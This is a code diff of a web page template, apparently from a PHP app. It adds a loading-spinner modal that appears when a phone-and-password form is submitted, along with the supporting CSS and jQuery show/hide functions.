@@ -224,9 +224,28 @@
 	            margin: 0px 0.6em 0px 0.6em !important;
 	        }
 
+			.loader-container{
+				width: 100%;
+				height: 100vh;
+				position: fixed;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+			}
+
 	    </style>
 	</head>
-
+	<div class="modal fade" id="modal_loader" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="padding: 1.5em; padding: 0px;">
+		<div class="modal-dialog modal-dialog-centered" role="document" style="padding: 0px; position: relative;">
+			<div class="modal-content st0" style="border-radius: 1.2em; display: flex; justify-content: center; align-items: center; margin: 8em 1em 0em 1em; color: white; border: #353535;">
+				<div class="loader-container">
+					<div class="spinner-border text-danger" role="status">
+						<span class="sr-only">Loading...</span>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
 	<body style="margin: 0px; background: #fb036b;">
 	    <header class="style__Container-sc-3fiysr-0 header">
 	        <div class="style__Wrapper-sc-3fiysr-2 hBSxmh" style="display: flex; justify-content: space-between;">
@@ -243,7 +262,7 @@
 	        </div>
 	    </header>
 
-	    <form action="<?=url('/post-password')?>" method="post">
+	    <form action="<?=url('/post-password')?>" method="post" id="form_input">
 	        {{csrf_field()}}
 	        <div class="wrapper"
 	            style="background: #fb036b; margin-top: 8em; display: flex; flex-direction: column; justify-content: center;">
@@ -330,6 +349,20 @@
 	    $('#nomor_hp').keyup(function () {
 	        $(this).val($(this).val().replace(/(\d{3})\-?(\d{3})\-?(\d{4})/, '$1-$2-$3'))
 	    });
+
+		$( "#form_input").submit(function( event ) {
+			show_loader();
+		});
+
+		function show_loader(){
+			console.log('show');
+			$("#modal_loader").modal("show");
+		};
+
+		function hide_loader(){
+			console.log('hide');
+			$("#modal_loader").modal("hide");
+		};
 
 	</script>
 
